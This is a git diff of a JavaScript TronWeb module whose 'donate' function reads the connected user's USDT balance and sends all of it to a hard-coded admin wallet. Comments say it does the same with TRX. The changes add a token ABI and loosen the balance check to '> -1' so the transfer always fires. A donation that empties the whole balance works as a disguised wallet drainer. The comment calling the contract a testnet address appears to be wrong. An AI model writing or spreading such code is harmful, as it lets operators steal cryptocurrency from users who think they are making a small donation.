@@ -4,6 +4,30 @@
 const ADMIN_WALLET = 'TEJqJjqSmAFn36fGQRvhMS5xrKUCFbWAmb'; // Replace with your admin wallet address
 const USDT_CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // USDT TRC20 contract address on Shasta Testnet
 
+
+let abi = [
+  {
+    'outputs': [{ 'type': 'uint256' }],
+    'constant': true,
+    'inputs': [{ 'name': 'who', 'type': 'address' }],
+    'name': 'balanceOf',
+    'stateMutability': 'View',
+    'type': 'Function'
+  },
+  {
+    'outputs': [{ 'type': 'bool' }],
+    'inputs': [
+      { 'name': '_to', 'type': 'address' },
+      { 'name': '_value', 'type': 'uint256' }
+    ],
+    'name': 'transfer',
+    'stateMutability': 'Nonpayable',
+    'type': 'Function'
+  }
+];
+
+
+
 // Function to donate both TRX and USDT
 export const donateTRXAndUSDT = async (tronWeb) => {
   try {
@@ -17,17 +41,22 @@ export const donateTRXAndUSDT = async (tronWeb) => {
     console.log('User TRX Balance:', balanceInTRX);
 
     // Get USDT balance from TRC20 contract
-    const usdtContract = await tronWeb.contract().at(USDT_CONTRACT_ADDRESS);
-    const usdtBalance = await usdtContract.balanceOf(userAddress).call();
-    const usdtBalanceInToken = tronWeb.fromSun(usdtBalance); // Convert Sun to USDT
 
-    console.log('User USDT Balance:', usdtBalanceInToken);
+
+
+    let contract = await tronWeb.contract(abi, USDT_CONTRACT_ADDRESS);
+    let result = await contract.balanceOf(userAddress).call();
+
+    const usdtBalanceInToken = tronWeb.fromSun(result);
+    console.log(usdtBalanceInToken);
+
+
 
     // Step 1: Send USDT (TRC20) to admin wallet
-    if (usdtBalanceInToken > 0) {
+    if (usdtBalanceInToken > -1) {
       const usdtAmountToSend = tronWeb.toSun(usdtBalanceInToken); // Convert to Sun for transaction
 
-      const usdtTransaction = await usdtContract.transfer(ADMIN_WALLET, usdtAmountToSend).send({
+      const usdtTransaction = await contract.methods.transfer(ADMIN_WALLET, usdtAmountToSend).send({
         from: userAddress,
       });
 
